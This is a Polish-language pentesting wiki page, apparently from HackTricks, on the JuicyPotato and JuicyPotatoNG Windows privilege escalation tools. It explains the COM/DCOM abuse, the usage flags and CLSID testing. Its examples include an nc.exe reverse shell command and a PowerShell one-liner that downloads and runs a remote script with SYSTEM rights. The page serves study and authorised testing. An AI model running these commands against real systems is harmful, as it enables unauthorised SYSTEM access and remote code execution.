# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato jest przestarzały. Zasadniczo działa na wersjach Windows do Windows 10 1803 / Windows Server 2016 włącznie. Zmiany wprowadzone przez Microsoft począwszy od Windows 10 1809 / Server 2019 spowodowały, że oryginalna technika przestała działać. W przypadku tych i nowszych buildów rozważ nowoczesne alternatywy, takie jak PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato i inne. Aktualne opcje oraz sposób użycia znajdziesz na poniższej stronie.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (wykorzystywanie złotych uprawnień) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Wersja_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_ z dodatkiem soku, czyli **kolejne narzędzie Local Privilege Escalation, umożliwiające przejście z Windows Service Accounts do NT AUTHORITY\SYSTEM**_<sup>[[1]](#references)</sup>

#### JuicyPotato można pobrać z [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Krótkie informacje o kompatybilności

- Działa niezawodnie do Windows 10 1803 i Windows Server 2016 włącznie, gdy bieżący kontekst ma SeImpersonatePrivilege lub SeAssignPrimaryTokenPrivilege.
- Nie działa z powodu hardeningu Microsoftu w Windows 10 1809 / Windows Server 2019 i nowszych. W przypadku tych buildów preferuj powyższe alternatywy.

### Podsumowanie <a href="#summary" id="summary"></a>

[**Z juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) i jego [warianty](https://github.com/decoder-it/lonelypotato) wykorzystują łańcuch eskalacji uprawnień oparty na usłudze [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126), która ma MiTM listener na `127.0.0.1:6666`, gdy posiadasz uprawnienia `SeImpersonate` lub `SeAssignPrimaryToken`. Podczas przeglądu buildów Windows znaleźliśmy konfigurację, w której `BITS` było celowo wyłączone, a port `6666` był zajęty.

Postanowiliśmy uzbroić [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Powitajcie Juicy Potato**.

> Teorię znajdziesz w [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) oraz w łańcuchu linków i referencji.<sup>[[4]](#references)</sup>

Odkryliśmy, że poza `BITS` istnieje kilka serwerów COM, które możemy wykorzystać. Muszą one jedynie:

1. być możliwe do utworzenia przez bieżącego użytkownika, zwykle „service user”, który ma uprawnienia impersonation
2. implementować interfejs `IMarshal`
3. działać jako użytkownik z podwyższonymi uprawnieniami (SYSTEM, Administrator, …)

Po przeprowadzeniu testów uzyskaliśmy i przetestowaliśmy obszerną listę [interesujących CLSID](http://ohpe.it/juicy-potato/CLSID/) w kilku wersjach Windows.

### Szczegóły Juicy <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato umożliwia:<sup>[[1]](#references)</sup>

- **Target CLSID** _wybór dowolnego CLSID._ [_Tutaj_](http://ohpe.it/juicy-potato/CLSID/) _znajdziesz listę uporządkowaną według systemu operacyjnego._
- **COM Listening port** _zdefiniowanie preferowanego portu nasłuchującego COM (zamiast zahardkodowanego przez marshaling portu 6666)_
- **COM Listening IP address** _powiązanie serwera z dowolnym adresem IP_
- **Process creation mode** _w zależności od uprawnień impersonated user możesz wybrać:_
- `CreateProcessWithToken` (wymaga `SeImpersonate`)
- `CreateProcessAsUser` (wymaga `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _uruchomienie pliku wykonywalnego lub skryptu, jeśli exploitation zakończy się powodzeniem_
- **Process Argument** _dostosowanie argumentów uruchamianego procesu_
- **RPC Server address** _w celu uzyskania stealthy approach możesz uwierzytelnić się na zewnętrznym serwerze RPC_
- **RPC Server port** _przydatne, jeśli chcesz uwierzytelnić się na zewnętrznym serwerze, a firewall blokuje port `135`…_
- **TEST mode** _głównie do celów testowych, np. testowania CLSID. Tworzy DCOM i wyświetla użytkownika tokenu. Zobacz_ [_tutaj informacje o testowaniu_](http://ohpe.it/juicy-potato/Test/)

### Użycie <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Końcowe przemyślenia <a href="#final-thoughts" id="final-thoughts"></a>

[**Z pliku Readme juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

Jeśli użytkownik ma uprawnienia `SeImpersonate` lub `SeAssignPrimaryToken`, to jesteś **SYSTEM**.

Uniemożliwienie nadużywania wszystkich tych serwerów COM jest niemal niemożliwe. Można rozważyć modyfikację uprawnień tych obiektów za pomocą `DCOMCNFG`, ale powodzenia — będzie to trudne.

Rzeczywistym rozwiązaniem jest ochrona wrażliwych kont i aplikacji uruchamianych na kontach `* SERVICE`. Zatrzymanie `DCOM` z pewnością uniemożliwiłoby ten exploit, ale mogłoby mieć poważny wpływ na bazowy system operacyjny.

Źródło: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG ponownie wprowadza local privilege escalation w stylu JuicyPotato we współczesnym Windows, łącząc:<sup>[[2]](#references)</sup>
- Rozwiązywanie OXID DCOM do lokalnego serwera RPC na wybranym porcie, co pozwala uniknąć starego, zahardkodowanego listenera 127.0.0.1:6666.
- Hook SSPI do przechwytywania i impersonacji przychodzącego uwierzytelniania SYSTEM bez wymagania RpcImpersonateClient, co umożliwia również CreateProcessAsUser, gdy obecne jest tylko SeAssignPrimaryTokenPrivilege.
- Sztuczki pozwalające spełnić ograniczenia aktywacji DCOM (np. wcześniejsze wymaganie grupy INTERACTIVE podczas targetowania klas PrintNotify / ActiveX Installer Service).

Ważne uwagi (zachowanie zmienia się między buildami):<sup>[[2]](#references)</sup>
- Wrzesień 2022: Początkowa technika działała na obsługiwanych celach Windows 10/11 i Server przy użyciu „INTERACTIVE trick”.
- Aktualizacja autorów ze stycznia 2023: Microsoft później zablokował INTERACTIVE trick. Inny CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) przywraca możliwość wykorzystania, ale według ich wpisu tylko na Windows 11 / Server 2022.

Podstawowe użycie (więcej flag w pomocy):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Jeśli atakujesz Windows 10 1809 / Server 2019, gdzie klasyczny JuicyPotato został załatany, preferuj alternatywy podane na górze (RoguePotato, PrintSpoofer, EfsPotato/GodPotato itp.). NG może działać zależnie od wersji buildu i stanu usługi.

## Przykłady

Uwaga: Odwiedź [tę stronę](https://ohpe.it/juicy-potato/CLSID/), aby wyświetlić listę CLSID do wypróbowania.

### Uzyskaj reverse shell nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Uruchom nowy CMD (jeśli masz dostęp przez RDP)

![Powershell rev - Uruchom nowy CMD (jeśli masz dostęp przez RDP): Uruchom nowy CMD (jeśli masz dostęp przez RDP)](<../../images/image (300).png>)

## Problemy z CLSID

Często domyślny CLSID używany przez JuicyPotato **nie działa**, a exploit kończy się niepowodzeniem. Zwykle potrzeba wielu prób, aby znaleźć **działający CLSID**. Aby uzyskać listę CLSID do przetestowania dla konkretnego systemu operacyjnego, odwiedź tę stronę:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Sprawdzanie CLSID**

Najpierw potrzebujesz kilku plików wykonywalnych oprócz juicypotato.exe.

Pobierz [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) i załaduj go do swojej sesji PS, a następnie pobierz i uruchom [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ten skrypt utworzy listę potencjalnych CLSID do przetestowania.

Następnie pobierz [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(zmień ścieżkę do listy CLSID oraz pliku wykonywalnego juicypotato) i uruchom go. Rozpocznie on próby użycia każdego CLSID, a **gdy numer portu się zmieni, będzie to oznaczać, że CLSID zadziałał**.

**Sprawdź** działające CLSID **za pomocą parametru -c**

## Odnośniki

- [1] [README Juicy Potato (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Strona projektu Juicy Potato (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Eskalacja uprawnień z kont usługowych do SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

{{#include ../../banners/hacktricks-training.md}}
